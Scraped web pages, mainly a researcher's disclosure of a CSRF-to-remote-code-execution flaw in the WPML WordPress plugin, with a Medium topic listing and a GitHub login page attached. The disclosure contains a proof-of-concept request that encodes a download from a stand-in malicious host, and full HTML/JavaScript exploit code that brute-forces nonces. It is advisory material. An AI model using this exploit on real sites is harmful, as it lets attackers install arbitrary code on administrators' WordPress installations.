=== Content from medium.com_706997d4_20250119_133633.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Ftag%2Fsecurity&%7Efeature=LoOpenInAppButton&%7Echannel=ShowTagPosts&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2Ftag%2Fsecurity&source=login---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2Ftag%2Fsecurity&source=login---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)[Explore topics](/explore-topics?source=topic_portal---topic_nav---security-------------------------------)[Security](/tag/security?source=topic_portal---topic_nav---security-------------------------------)[Technology](/tag/technology?source=topic_portal---topic_nav---security-------------------------------)[Cybersecurity](/tag/cybersecurity?source=topic_portal---topic_nav---security-------------------------------)[Privacy](/tag/privacy?source=topic_portal---topic_nav---security-------------------------------)[Blockchain](/tag/blockchain?source=topic_portal---topic_nav---security-------------------------------)[Hacking](/tag/hacking?source=topic_portal---topic_nav---security-------------------------------)[Cryptocurrency](/tag/cryptocurrency?source=topic_portal---topic_nav---security-------------------------------)[Tech](/tag/tech?source=topic_portal---topic_nav---security-------------------------------)[DevOps](/tag/devops?source=topic_portal---topic_nav---security-------------------------------)[AWS](/tag/aws?source=topic_portal---topic_nav---security-------------------------------)
## Security

Topic·11.7K Followers·125K Stories[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fsignedin%2Fsubscriptions%2Ftag%2Fsecurity%3FfollowSource%3Dtopics_v2&operation=register&redirect=https%3A%2F%2Fmedium.com%2Ftag%2Fsecurity&source=------security--------------------follow_tag-----------)
## Recommended stories

![Introducing BloodHound CLI](https://miro.medium.com/v2/resize:fit:1358/format:webp/1*rx2zghVMlzubpfIA3bxNdQ.png)[![Posts By SpecterOps Team Members](https://miro.medium.com/v2/resize:fill:40:40/1*D-FDlfkqivRBQZoESrwtqw.png)](https://medium.com/specter-ops-posts?source=topic_portal---recommended_stories---security---0-84--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)

In

[Posts By SpecterOps Team Members](https://medium.com/specter-ops-posts?source=topic_portal---recommended_stories---security---0-84--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)

by

[Christopher Maddalena](/%40cmaddy?source=topic_portal---recommended_stories---security---0-84--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)[## Introducing BloodHound CLI

### We created a new tool to help you install and manage BloodHound instances, BloodHound CLI!](/specter-ops-posts/introducing-bloodhound-cli-7dfaf82e2df8?source=topic_portal---recommended_stories---security---0-84--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)19h ago![How leboncoin protects 35 million accounts without compromising user experience](https://miro.medium.com/v2/resize:fit:1358/format:webp/1*Zxz9lTkM2aP7B6YE6YGRqQ.png)[![leboncoin tech Blog](https://miro.medium.com/v2/resize:fill:40:40/1*0pzfzuelW-sIjb4NvmDNkw.png)](https://medium.com/leboncoin-tech-blog?source=topic_portal---recommended_stories---security---1-107--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)

In

[leboncoin tech Blog](https://medium.com/leboncoin-tech-blog?source=topic_portal---recommended_stories---security---1-107--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)

by

[leboncoin tech](/%40leboncoin_tech?source=topic_portal---recommended_stories---security---1-107--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)[## How leboncoin protects 35 million accounts without compromising user experience

### By Arnaud Droit, Head of Product User Account](/leboncoin-tech-blog/how-leboncoin-protects-35-million-accounts-without-compromising-user-experience-5d7a53043f78?source=topic_portal---recommended_stories---security---1-107--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)5d ago[3](/leboncoin-tech-blog/how-leboncoin-protects-35-million-accounts-without-compromising-user-experience-5d7a53043f78?source=topic_portal---recommended_stories---security---1-107--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)[![HX007](https://miro.medium.com/v2/resize:fill:40:40/1*TJB9DyH48tw5604SH8APUQ.jpeg)](/%40HX007?source=topic_portal---recommended_stories---security---2-85--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)[HX007](/%40HX007?source=topic_portal---recommended_stories---security---2-85--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)[## A Journey of Limited Path Traversal To RCE With $40,000 Bounty!

### #Introduce Myself:](/%40HX007/a-journey-of-limited-path-traversal-to-rce-with-40-000-bounty-fc63c89576ea?source=topic_portal---recommended_stories---security---2-85--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)1d ago[12](/%40HX007/a-journey-of-limited-path-traversal-to-rce-with-40-000-bounty-fc63c89576ea?source=topic_portal---recommended_stories---security---2-85--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)![A Journey of Limited Path Traversal To RCE With $40,000 Bounty!](https://miro.medium.com/v2/resize:fill:160:106/format:webp/1*ghObfjAwCYs-BkL7Tf4vrA.png)1d ago[12](/%40HX007/a-journey-of-limited-path-traversal-to-rce-with-40-000-bounty-fc63c89576ea?source=topic_portal---recommended_stories---security---2-85--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)[![ChainLight Blog & Research](https://miro.medium.com/v2/resize:fill:40:40/1*w3VwMXiDZH1I6vpFLtPepw.png)](https://medium.com/chainlight?source=topic_portal---recommended_stories---security---3-84--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)

In

[ChainLight Blog & Research](https://medium.com/chainlight?source=topic_portal---recommended_stories---security---3-84--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)

by

[c4lvin | ChainLight](/%40calvin0420?source=topic_portal---recommended_stories---security---3-84--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)[## Web3 Hack Postmortem 2024

### This report provides statistics and in-depth analysis on 204 web3 security incidents occurred in 2024.](/chainlight/web3-hack-postmortem-2024-2b8ed0116c93?source=topic_portal---recommended_stories---security---3-84--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)20h ago![Web3 Hack Postmortem 2024](https://miro.medium.com/v2/resize:fill:160:106/format:webp/1*HGHju8MJbacAj6BChybIyw.png)20h ago[![Hayden Baillio](https://miro.medium.com/v2/resize:fill:40:40/1*O2kZsDm842aU5gOPENLyiw.png)](/%40haydengpt?source=topic_portal---recommended_stories---security---4-107--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)[Hayden Baillio](/%40haydengpt?source=topic_portal---recommended_stories---security---4-107--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)[## The Great Node.js Intervention of 2025

### When CVEs Become Tough Love](/%40haydengpt/the-great-node-js-intervention-of-2025-24821f8d0cec?source=topic_portal---recommended_stories---security---4-107--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)Jan 9[5](/%40haydengpt/the-great-node-js-intervention-of-2025-24821f8d0cec?source=topic_portal---recommended_stories---security---4-107--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)![The Great Node.js Intervention of 2025](https://miro.medium.com/v2/resize:fill:160:106/format:webp/1*3FywvbncwaNlRbobUQdw4g.jpeg)Jan 9[5](/%40haydengpt/the-great-node-js-intervention-of-2025-24821f8d0cec?source=topic_portal---recommended_stories---security---4-107--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)![Introducing BloodHound CLI](https://miro.medium.com/v2/resize:fit:1144/format:webp/1*rx2zghVMlzubpfIA3bxNdQ.png)![Introducing BloodHound CLI](https://miro.medium.com/v2/resize:fit:1144/format:webp/1*rx2zghVMlzubpfIA3bxNdQ.png)[![Posts By SpecterOps Team Members](https://miro.medium.com/v2/resize:fill:40:40/1*D-FDlfkqivRBQZoESrwtqw.png)](https://medium.com/specter-ops-posts?source=topic_portal---recommended_stories---security---0-84--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)

In

[Posts By SpecterOps Team Members](https://medium.com/specter-ops-posts?source=topic_portal---recommended_stories---security---0-84--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)

by

[Christopher Maddalena](/%40cmaddy?source=topic_portal---recommended_stories---security---0-84--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)[## Introducing BloodHound CLI

### We created a new tool to help you install and manage BloodHound instances, BloodHound CLI!](/specter-ops-posts/introducing-bloodhound-cli-7dfaf82e2df8?source=topic_portal---recommended_stories---security---0-84--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)19h ago![How leboncoin protects 35 million accounts without compromising user experience](https://miro.medium.com/v2/resize:fit:1144/format:webp/1*Zxz9lTkM2aP7B6YE6YGRqQ.png)![How leboncoin protects 35 million accounts without compromising user experience](https://miro.medium.com/v2/resize:fit:1144/format:webp/1*Zxz9lTkM2aP7B6YE6YGRqQ.png)[![leboncoin tech Blog](https://miro.medium.com/v2/resize:fill:40:40/1*0pzfzuelW-sIjb4NvmDNkw.png)](https://medium.com/leboncoin-tech-blog?source=topic_portal---recommended_stories---security---1-107--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)

In

[leboncoin tech Blog](https://medium.com/leboncoin-tech-blog?source=topic_portal---recommended_stories---security---1-107--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)

by

[leboncoin tech](/%40leboncoin_tech?source=topic_portal---recommended_stories---security---1-107--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)[## How leboncoin protects 35 million accounts without compromising user experience

### By Arnaud Droit, Head of Product User Account](/leboncoin-tech-blog/how-leboncoin-protects-35-million-accounts-without-compromising-user-experience-5d7a53043f78?source=topic_portal---recommended_stories---security---1-107--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)5d ago[3](/leboncoin-tech-blog/how-leboncoin-protects-35-million-accounts-without-compromising-user-experience-5d7a53043f78?source=topic_portal---recommended_stories---security---1-107--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)![A Journey of Limited Path Traversal To RCE With $40,000 Bounty!](https://miro.medium.com/v2/resize:fit:730/format:webp/1*ghObfjAwCYs-BkL7Tf4vrA.png)[![HX007](https://miro.medium.com/v2/resize:fill:40:40/1*TJB9DyH48tw5604SH8APUQ.jpeg)](/%40HX007?source=topic_portal---recommended_stories---security---2-85--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)[HX007](/%40HX007?source=topic_portal---recommended_stories---security---2-85--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)[## A Journey of Limited Path Traversal To RCE With $40,000 Bounty!

### #Introduce Myself:](/%40HX007/a-journey-of-limited-path-traversal-to-rce-with-40-000-bounty-fc63c89576ea?source=topic_portal---recommended_stories---security---2-85--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)1d ago[12](/%40HX007/a-journey-of-limited-path-traversal-to-rce-with-40-000-bounty-fc63c89576ea?source=topic_portal---recommended_stories---security---2-85--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)![Web3 Hack Postmortem 2024](https://miro.medium.com/v2/resize:fit:730/format:webp/1*HGHju8MJbacAj6BChybIyw.png)[![ChainLight Blog & Research](https://miro.medium.com/v2/resize:fill:40:40/1*w3VwMXiDZH1I6vpFLtPepw.png)](https://medium.com/chainlight?source=topic_portal---recommended_stories---security---3-84--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)

In

[ChainLight Blog & Research](https://medium.com/chainlight?source=topic_portal---recommended_stories---security---3-84--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)

by

[c4lvin | ChainLight](/%40calvin0420?source=topic_portal---recommended_stories---security---3-84--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)[## Web3 Hack Postmortem 2024

### This report provides statistics and in-depth analysis on 204 web3 security incidents occurred in 2024.](/chainlight/web3-hack-postmortem-2024-2b8ed0116c93?source=topic_portal---recommended_stories---security---3-84--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)20h ago![The Great Node.js Intervention of 2025](https://miro.medium.com/v2/resize:fit:730/format:webp/1*3FywvbncwaNlRbobUQdw4g.jpeg)[![Hayden Baillio](https://miro.medium.com/v2/resize:fill:40:40/1*O2kZsDm842aU5gOPENLyiw.png)](/%40haydengpt?source=topic_portal---recommended_stories---security---4-107--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)[Hayden Baillio](/%40haydengpt?source=topic_portal---recommended_stories---security---4-107--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)[## The Great Node.js Intervention of 2025

### When CVEs Become Tough Love](/%40haydengpt/the-great-node-js-intervention-of-2025-24821f8d0cec?source=topic_portal---recommended_stories---security---4-107--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)Jan 9[5](/%40haydengpt/the-great-node-js-intervention-of-2025-24821f8d0cec?source=topic_portal---recommended_stories---security---4-107--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)![How I get 7 open redirect and 7 XSS in public program!](https://miro.medium.com/v2/resize:fit:730/format:webp/1*SFgsHF9LprUTL3Al_Ft5ug.png)[![Spider4](https://miro.medium.com/v2/resize:fill:40:40/1*2cH6UQPw_w4YBuheLZAqNA.jpeg)](/%40mohamed.yasser442200?source=topic_portal---recommended_stories---security---5-85--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)[Spider4](/%40mohamed.yasser442200?source=topic_portal---recommended_stories---security---5-85--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)[## How I get 7 open redirect and 7 XSS in public program!](/%40mohamed.yasser442200/how-i-get-7-open-redirect-and-7-xss-in-public-program-7518a3f26b49?source=topic_portal---recommended_stories---security---5-85--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)Jan 9[9](/%40mohamed.yasser442200/how-i-get-7-open-redirect-and-7-xss-in-public-program-7518a3f26b49?source=topic_portal---recommended_stories---security---5-85--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)![Walls of Love](https://miro.medium.com/v2/resize:fit:730/format:webp/0*xPz_gvv-_Kc9irsZ)[![The Honest Perspective](https://miro.medium.com/v2/resize:fill:40:40/1*1OepgUO7clUGjRLknngcZw.jpeg)](https://medium.com/the-honest-perspective?source=topic_portal---recommended_stories---security---6-107--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)

In

[The Honest Perspective](https://medium.com/the-honest-perspective?source=topic_portal---recommended_stories---security---6-107--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)

by

[Z.A. Roberts](/%40zchroberts94?source=topic_portal---recommended_stories---security---6-107--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)[## Walls of Love

### How Do You Let Love In When You’ve Built a Life Behind Walls?](/the-honest-perspective/walls-of-love-546e23613042?source=topic_portal---recommended_stories---security---6-107--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)Dec 27, 2024[38](/the-honest-perspective/walls-of-love-546e23613042?source=topic_portal---recommended_stories---security---6-107--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)![SSL Certificates: A Common Interview Question and How to Answer It](https://miro.medium.com/v2/resize:fit:730/format:webp/1*Ti72VqZpAvm5dDBoMruhjg.png)[![Saquib Khan](https://miro.medium.com/v2/resize:fill:40:40/1*Lb8-Ok-xsM9LXqzEsE6A3w.jpeg)](/%40ksaquib?source=topic_portal---recommended_stories---security---7-85--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)[Saquib Khan](/%40ksaquib?source=topic_portal---recommended_stories---security---7-85--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)[## SSL Certificates: A Common Interview Question and How to Answer It

### Secure Sockets Layer (SSL) certificates are pivotal in ensuring the security of data transmitted across the internet. By encrypting…](/%40ksaquib/ssl-certificates-a-common-interview-question-and-how-to-answer-it-b1716130ef38?source=topic_portal---recommended_stories---security---7-85--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)Dec 27, 2024[2](/%40ksaquib/ssl-certificates-a-common-interview-question-and-how-to-answer-it-b1716130ef38?source=topic_portal---recommended_stories---security---7-85--------------------4ac5ba11_e095_458d_9e76_9534da745e2b-------)[See more recommended stories](/tag/security/recommended?source=topic_portal------security-------------------------------)



=== Content from www.owasp.org_d1f19d24_20250119_133632.html ===

[Skip to content](#start-of-content)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

# Sign in to GitHub

{{ message }}

Username or email address

Password

[Forgot password?](/password_reset)

## Password login alternatives

Sign in with a passkey

New to GitHub?
[Create an account](/signup?return_to=%2Fpages%2Fauth%3Fnonce%3D786126c6-3b95-4235-ac05-6355b4ebe345%26page_id%3D11299051%26path%3DL1BIUE1hZ2ljVHJpY2tzLVR5cGVKdWdnbGluZy5wZGY&source=login)

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Docs](https://docs.github.com)
* [Contact GitHub Support](https://support.github.com)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from medium.com_2864ae08_20250119_114952.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F9c9486c13577&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Farall.medium.com%2Fsitepress-multilingual-cms-wplugin-wpml-4-3-7-b-2-9c9486c13577&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Farall.medium.com%2Fsitepress-multilingual-cms-wplugin-wpml-4-3-7-b-2-9c9486c13577&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# Sitepress Multilingual CMS WordPress Plugin (WPML) < 4.3.7-b.2 — Authenticated Cross Site Request Forgery lead to Remote Code Execution

[![Arall](https://miro.medium.com/v2/resize:fill:88:88/1*dmbNkD5D-u45r44go_cf0g.png)](/?source=post_page---byline--9c9486c13577--------------------------------)

[Arall](/?source=post_page---byline--9c9486c13577--------------------------------)

·

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fe565bb51c105&operation=register&redirect=https%3A%2F%2Farall.medium.com%2Fsitepress-multilingual-cms-wplugin-wpml-4-3-7-b-2-9c9486c13577&user=Arall&userId=e565bb51c105&source=post_page-e565bb51c105--byline--9c9486c13577---------------------post_header-----------)

3 min read·Mar 9, 2020

--

1

Listen

Share

![]()
# The issue

In the **installer\_download\_plugin** action, the WordPress nonce token is not compared properly (loose comparison).

```
$data = json_decode(base64_decode(sanitize_text_field($_POST['data'])), true);if ($data['nonce'] == wp_create_nonce('install_plugin_' . $data['url'])) {
```

And example of POST data parameter would be (base64 encoded):

```
{"url":"https://example.com/plugin.zip","slug":"wpml-media-translation","nonce":"93e756d79e","repository_id":"wpml"}
```

Notice that **the nonce can be casted into integer by removing the quotes**.

When comparing a string to a number, **PHP will attempt to convert the string to a number then perform a numeric comparison**. Those are some behaviour examples:

```
if (0 == '0...') // True
if (0 == 'a...') // True
if (1 == '1...') // True
if (12 == '12..') // True
```

In order to make the statement true, attackers can send multiple requests. Knowing that WordPress nonces are 10 hexadecimal characters, the odds to obtain a true statement are:

With **1 request**, using 0 as a nonce: **40%**

* Nonces starting by 0 followed by a letter char (37.5%)
* Nonces starting by a letter char (2.34%)

With **10 requests**, using from 0 to 9 as nonce: **65%**

* Nonces starting by one digit or letter (9/16 \* 10/16 of failure)

With **100 requests**, using from 0 to 99 as nonce: **80.2%**

* Nonces starting by two digits or letter (9/16 \* 9/16 \* 10/16 of failure)

Attackers could implement (as demonstrated in the exploit code) a small brute-force code in javascript, that will be **executed silently once a victim opens a link**.

Once a requests is performed successfully (with a true statement), the requested plugin URL will be installed, which could contain arbitrary PHP code.

And once the plugin is installed, the attacker can directly access the downloaded files by requesting **/wp-content/plugins/<plugin-name>/<file-name>.php**

# Impact

Attackers can craft malicious links that, once opened by an authenticated administrator, will **execute / install malicious code / plugin in the website**.

# Vulnerable code

sitepress-multilingual-cms/vendor/otgs/installer/includes/class-wp-installer.php, **download\_plugin\_ajax\_handler** function.

# Proof of Concept

Payload:

```
{"url":"https:\/\/downloads.wordpress.org\/plugin\/classic-editor.1.5.zip", "slug": "woocommerce-multilingual", "nonce": 0, "repository_id": "wpml"}
```

Request:

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: wordpress.localaction=installer_download_plugin&data=eyJ1cmwiOiJodHRwczpcL1wvZXZpbC5sb2NhbC9tYWx3YXJlLnppcCIsICJzbHVnIjogIndvb2NvbW1lcmNlLW11bHRpbGluZ3VhbCIsICJub25jZSI6IDAsICJyZXBvc2l0b3J5X2lkIjogIndwbWwifQ==
```

Response:

```
HTTP/1.1 200 OK{"install":1,"version":0,"non_stable":"","plugin_id":false,"nonce":"c3734d6b6b","success":true,"message":""}
```

Steps to reproduce:

1. Login as an admin into the target WordPress website (pretending being a victim).
2. Modify the exploit with the proper target WordPress website URL and the Plugin URL that will be installed (need to be reachable by the target host).
3. As a victim, open the exploit with the same browser that was used to login into the target WordPress website, and press the exploit button (this can be automated to reduce victim’s interaction).
4. After a few seconds (once all the requests are performed), the plugin will appear installed in the target WordPress website.

# Exploit code

```
<html>
<body>
<form id="form" method="post" target="iframe0">
<input type="hidden" name="action" value="installer_download_plugin" />
<input type="hidden" id="data" name="data" value="" />
</form>
<div id="invisible" style="display:none"></div>
<button id="exploit">Exploit</button>
<script>
var TARGET = '[http://wordpress.local](http://wordpress.local/)';
var PLUGIN_URL = '<https://downloads.wordpress.org/plugin/contact-form-7.5.1.6.zip>'
var LIMIT = 100;
var payload = {
'url': PLUGIN_URL.replace(/\//g, '\/'),
'slug': 'woocommerce-multilingual',
'nonce': null,
'repository_id': 'wpml'
}
document.getElementById('form').action = TARGET + '/wp-admin/admin-ajax.php';
document.getElementById('exploit').addEventListener('click', function(e){
for (nonce = 0; nonce <= LIMIT ; nonce++) {
// Prepare the payload
payload.nonce = nonce;
data = btoa(JSON.stringify(payload))
// Create the iframe
var iframe = document.createElement('iframe');
[iframe.name](http://iframe.name/) = 'iframe' + nonce;
document.getElementById('invisible').appendChild(iframe)
// Submit the form
document.getElementById('data').value = data;
document.getElementById('form').target = 'iframe' + nonce;
document.getElementById('form').submit();
}
})
</script>
</body>
</html>
```
# Timeline

* 2019–12–09 Vendor was notified with all the details described.
* 2019–12–09 Vendor replied acknowledging the issue.
* 2019–12–24 Vendor publishes version 4.3.7-b.1.
* 2019–12–30 The new release is tested and confirmed that still vulnerable. Vendor is informed.
* 2020–01–20 Vendor publishes version 4.3.7-b.2.
* 2019–12–30 Public disclosure.

# Links

<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10568>

<https://wpvulndb.com/vulnerabilities/10131>

# References

<https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf>

[Security](https://medium.com/tag/security?source=post_page-----9c9486c13577--------------------------------)[Vulnerability](https://medium.com/tag/vulnerability?source=post_page-----9c9486c13577--------------------------------)[Csrf](https://medium.com/tag/csrf?source=post_page-----9c9486c13577--------------------------------)[Wpml](https://medium.com/tag/wpml?source=post_page-----9c9486c13577--------------------------------)[WordPress](https://medium.com/tag/wordpress?source=post_page-----9c9486c13577--------------------------------)

--

--

1

[![Arall](https://miro.medium.com/v2/resize:fill:96:96/1*dmbNkD5D-u45r44go_cf0g.png)](/?source=post_page---post_author_info--9c9486c13577--------------------------------)[![Arall](https://miro.medium.com/v2/resize:fill:128:128/1*dmbNkD5D-u45r44go_cf0g.png)](/?source=post_page---post_author_info--9c9486c13577--------------------------------)Follow[## Written by Arall](/?source=post_page---post_author_info--9c9486c13577--------------------------------)[6 Followers](/followers?source=post_page---post_author_info--9c9486c13577--------------------------------)·[4 Following](/following?source=post_page---post_author_info--9c9486c13577--------------------------------)Follow
## Responses (1)

See all responses[Help](https://help.medium.com/hc/en-us?source=post_page-----9c9486c13577--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----9c9486c13577--------------------------------)[About](https://medium.com/about?autoplay=1&source=post_page-----9c9486c13577--------------------------------)[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----9c9486c13577--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----9c9486c13577--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----9c9486c13577--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----9c9486c13577--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----9c9486c13577--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----9c9486c13577--------------------------------)[Teams](https://medium.com/business?source=post_page-----9c9486c13577--------------------------------)


